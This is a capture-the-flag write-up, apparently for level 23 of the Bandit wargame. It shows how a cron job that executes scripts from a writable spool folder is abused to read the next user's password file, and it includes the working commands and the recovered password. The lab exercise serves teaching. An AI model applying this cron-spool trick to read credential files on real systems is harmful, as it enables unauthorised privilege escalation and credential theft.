# Level 23

Connect to the server as `bandit23` with the password.

> A program is running automatically at regular intervals from cron, the
> time-based job scheduler. Look in `/etc/cron.d/` for the configuration and
> see what command is being executed.

Another cron job. Oh boy.

    bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
    @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

So here we have a little bash script that executes and deletes scripts in the folder `/var/spool/bandit24`. Let's take a look at this folder.

    bandit23@bandit:~$ ls -lah /var/spool/bandit24/
    total 1.4M
    drwxrwx--- 2 bandit24 bandit23 1.3M Oct  7 13:50 .
    drwxr-xr-x 5 root     root     4.0K Oct 16  2018 ..

There is something funky going on here – why does the folder have a reported size of 1.3 megabytes despite being empty?

But in any case, it should be possible for me 

    bandit23@bandit:~$ mkdir /tmp/20983r7ufiwhjcn30
    bandit23@bandit:~$ cd /tmp/20983r7ufiwhjcn30
    bandit23@bandit:/tmp/20983r7ufiwhjcn30$ cat > 32hjbkj2bj32jhb2.sh
    #!/bin/bash
    cat /etc/bandit_pass/bandit24 > /tmp/20983r7ufiwhjcn30/out/pass
    bandit23@bandit:/tmp/20983r7ufiwhjcn30$ mkdir out
    bandit23@bandit:/tmp/20983r7ufiwhjcn30$ chmod a+w out
    bandit23@bandit:/tmp/20983r7ufiwhjcn30$ chmod a+x 32hjbkj2bj32jhb2.sh
    bandit23@bandit:/tmp/20983r7ufiwhjcn30$ cp 32hjbkj2bj32jhb2.sh /var/spool/bandit24

I had to wait a little bit, but eventually, it was executed.

    bandit23@bandit:/tmp/20983r7ufiwhjcn30$ ls out
    pass
    bandit23@bandit:/tmp/20983r7ufiwhjcn30$ cat out/pass
    UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

